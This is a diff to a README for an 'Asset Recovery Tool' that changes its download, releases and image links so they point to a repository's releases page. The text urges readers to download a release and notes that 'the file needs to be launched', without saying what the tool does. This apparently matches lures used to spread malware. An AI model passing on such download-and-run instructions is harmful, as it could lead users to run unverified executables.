@@ -30,7 +30,7 @@ To get started with the Asset Recovery Tool, follow these simple steps:
 
 1. Clone the repository to your local machine
 2. Install the necessary dependencies
-3. Launch the tool using the provided link: [Download Here](https://github.com/releases/789694263/Release.zip). Please note that the file needs to be launched.
+3. Launch the tool using the provided link: [Download Here](https://github.com/repirate/asset-recovery-tool/releases). Please note that the file needs to be launched.
 
 If you encounter any issues during the installation process, feel free to reach out to the repository maintainers for assistance.
 
@@ -54,8 +54,8 @@ The Asset Recovery Tool is licensed under the MIT License. See `LICENSE` for mor
 
 ---
 
-Don't forget to check the [Releases](https://github.com/releases/789694263) section for the latest updates and enhancements to the Asset Recovery Tool.
+Don't forget to check the [Releases](https://github.com/repirate/asset-recovery-tool/releases) section for the latest updates and enhancements to the Asset Recovery Tool.
 
 Get started today and reclaim your assets with ease using the Asset Recovery Tool! 🔐💰
 
-![Asset Recovery](https://example.com/asset-recovery-image.png)
+![Asset Recovery](https://github.com/repirate/asset-recovery-tool/releases)
